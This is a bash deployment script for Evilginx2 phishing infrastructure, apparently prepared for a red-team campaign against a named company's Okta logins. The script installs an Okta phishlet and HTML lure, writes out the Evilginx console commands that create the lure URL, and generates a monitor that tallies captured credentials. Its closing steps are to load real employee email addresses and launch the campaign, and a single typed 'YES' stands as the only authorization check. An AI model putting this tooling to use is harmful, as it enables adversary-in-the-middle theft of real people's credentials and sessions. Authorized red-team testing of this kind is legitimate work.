#!/bin/bash
# === EVILGINX2 INFRASTRUCTURE DEPLOYMENT SCRIPT ===
# For authorized red team testing - Wyndham Properties
# Sets up phishing infrastructure with security hardening

set -euo pipefail
IFS=$'\n\t'

### === CONFIG ===
source ./config.conf 2>/dev/null || {
    echo "Error: config.conf not found. Please configure your settings first."
    exit 1
}

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

### === COLORS ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

### === FUNCTIONS ===
log() { echo -e "${BLUE}[DEPLOY]${NC} $*"; }
success() { echo -e "${GREEN}[✓]${NC} $*"; }
warning() { echo -e "${YELLOW}[!]${NC} $*"; }
error() { echo -e "${RED}[✗]${NC} $*"; }
phase() { echo -e "${PURPLE}[PHASE]${NC} $*"; }

print_banner() {
    echo -e "${GREEN}"
    cat << "EOF"
    🚀 INFRASTRUCTURE DEPLOYMENT
    Wyndham Properties Authorized Testing
EOF
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        warning "Running as root. This is required for some operations."
    else
        error "Some operations require root privileges. Consider running with sudo."
    fi
}

check_prerequisites() {
    phase "Checking Prerequisites"
    
    local missing=()
    
    # Check required commands
    command -v curl >/dev/null 2>&1 || missing+=("curl")
    command -v dig >/dev/null 2>&1 || missing+=("dig")
    command -v iptables >/dev/null 2>&1 || missing+=("iptables")
    command -v ufw >/dev/null 2>&1 || missing+=("ufw")
    
    # Check Evilginx2
    if [ ! -f "$EVILGINX_PATH/evilginx" ]; then
        missing+=("evilginx2")
    fi
    
    # Check phishlet
    if [ ! -f "./phishlets_okta.yaml" ]; then
        missing+=("okta phishlet")
    fi
    
    if [ ${#missing[@]} -gt 0 ]; then
        error "Missing prerequisites:"
        printf '  • %s\n' "${missing[@]}"
        exit 1
    fi
    
    success "All prerequisites satisfied"
}

verify_authorization() {
    phase "Authorization Verification"
    
    warning "CRITICAL: This script is for AUTHORIZED testing only!"
    echo ""
    echo "Target: $TARGET_DOMAIN"
    echo "Campaign: $CAMPAIGN_NAME"
    echo "Phishing Domain: $PHISHING_DOMAIN"
    echo ""
    
    read -p "Do you have written authorization from Wyndham Properties? (YES/no): " auth
    if [[ ! "$auth" == "YES" ]]; then
        error "Explicit authorization required. Exiting."
        exit 1
    fi
    
    if [[ "$PHISHING_DOMAIN" == "your-domain.com" ]]; then
        error "Please configure your actual phishing domain in config.conf"
        exit 1
    fi
    
    success "Authorization verified"
}

setup_firewall() {
    phase "Configuring Firewall"
    
    if [[ "$ENABLE_IPTABLES" == "true" ]]; then
        log "Setting up iptables rules..."
        
        # Flush existing rules
        iptables -F
        iptables -X
        iptables -t nat -F
        iptables -t nat -X
        
        # Default policies
        iptables -P INPUT DROP
        iptables -P FORWARD DROP
        iptables -P OUTPUT ACCEPT
        
        # Allow loopback
        iptables -A INPUT -i lo -j ACCEPT
        iptables -A OUTPUT -o lo -j ACCEPT
        
        # Allow established connections
        iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
        
        # Allow specified ports
        IFS=',' read -ra PORTS <<< "$ALLOWED_PORTS"
        for port in "${PORTS[@]}"; do
            iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
            log "Opened port $port"
        done
        
        # Rate limiting for HTTP/HTTPS
        if [[ "$RATE_LIMIT" == "true" ]]; then
            iptables -A INPUT -p tcp --dport 80 -m limit --limit "$MAX_REQUESTS_PER_MINUTE"/minute -j ACCEPT
            iptables -A INPUT -p tcp --dport 443 -m limit --limit "$MAX_REQUESTS_PER_MINUTE"/minute -j ACCEPT
            log "Rate limiting enabled: $MAX_REQUESTS_PER_MINUTE req/min"
        fi
        
        # Save rules
        iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
        
        success "Firewall configured"
    else
        warning "Firewall configuration skipped (disabled in config)"
    fi
}

deploy_phishlet() {
    phase "Deploying Okta Phishlet"
    
    # Copy phishlet to Evilginx directory
    cp "./phishlets_okta.yaml" "$EVILGINX_PATH/phishlets/okta.yaml"
    success "Phishlet copied to $EVILGINX_PATH/phishlets/"
    
    # Copy HTML lure
    mkdir -p "$EVILGINX_PATH/lures"
    cp "./okta.html" "$EVILGINX_PATH/lures/"
    success "HTML lure copied"
    
    log "Phishlet deployment completed"
}

configure_evilginx() {
    phase "Configuring Evilginx2"
    
    # Create Evilginx config commands
    cat > "/tmp/evilginx_setup.txt" << EOF
config domain $PHISHING_DOMAIN
config ipv4 external $(curl -s ifconfig.me)
phishlets hostname okta $PHISHING_DOMAIN
phishlets enable okta
lures create okta
lures get-url 0
EOF
    
    success "Evilginx configuration prepared"
    warning "Run the following commands in Evilginx2 console:"
    echo ""
    cat /tmp/evilginx_setup.txt
    echo ""
    warning "Start Evilginx2 with: sudo $EVILGINX_PATH/evilginx"
}

setup_logging() {
    phase "Setting up Logging"
    
    # Create logs directory
    mkdir -p "./logs"
    
    # Setup log rotation
    cat > "/etc/logrotate.d/evilginx_campaign" << EOF
$SCRIPT_DIR/logs/*.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
}
EOF
    
    success "Logging configured"
}

create_monitoring_script() {
    phase "Creating Monitoring Script"
    
    cat > "./monitor_campaign.sh" << 'EOF'
#!/bin/bash
# Campaign Monitoring Script

EVILGINX_LOG="/opt/evilginx/logs"
CAMPAIGN_LOG="./logs/campaign_monitor.log"

monitor_sessions() {
    echo "$(date): Checking for new sessions..." >> "$CAMPAIGN_LOG"
    
    if [ -f "$EVILGINX_LOG/sessions.log" ]; then
        tail -n 10 "$EVILGINX_LOG/sessions.log" >> "$CAMPAIGN_LOG"
    fi
    
    if [ -f "$EVILGINX_LOG/creds.log" ]; then
        local cred_count=$(wc -l < "$EVILGINX_LOG/creds.log")
        echo "$(date): Total credentials captured: $cred_count" >> "$CAMPAIGN_LOG"
    fi
}

# Run monitoring
monitor_sessions
EOF
    
    chmod +x "./monitor_campaign.sh"
    success "Monitoring script created"
}

display_next_steps() {
    phase "Deployment Complete"
    
    cat << EOF

🎯 INFRASTRUCTURE DEPLOYMENT SUCCESSFUL

Next Steps:
1. Verify DNS configuration for $PHISHING_DOMAIN
2. Start Evilginx2: sudo $EVILGINX_PATH/evilginx
3. Run the configuration commands shown above
4. Test the phishing site: https://$PHISHING_DOMAIN
5. Customize email templates with your domain
6. Populate targets.txt with real email addresses
7. Launch the campaign with: ./wyndham_redteam_master.sh

Campaign Files:
✓ Configuration: config.conf
✓ Targets: targets.txt  
✓ Phishlet: phishlets_okta.yaml
✓ Email Templates: generate_okta_email.sh
✓ Monitoring: monitor_campaign.sh

Security:
✓ Firewall configured
✓ Rate limiting enabled
✓ Logging setup complete

Remember: This is for AUTHORIZED testing only!

EOF
}

### === MAIN EXECUTION ===
main() {
    print_banner
    check_root
    verify_authorization
    check_prerequisites
    setup_firewall
    deploy_phishlet
    configure_evilginx
    setup_logging
    create_monitoring_script
    display_next_steps
}

# Handle command line arguments
case "${1:-deploy}" in
    "deploy")
        main
        ;;
    "firewall-only")
        print_banner
        check_root
        setup_firewall
        ;;
    "phishlet-only")
        print_banner
        deploy_phishlet
        ;;
    *)
        echo "Usage: $0 [deploy|firewall-only|phishlet-only]"
        exit 1
        ;;
esac
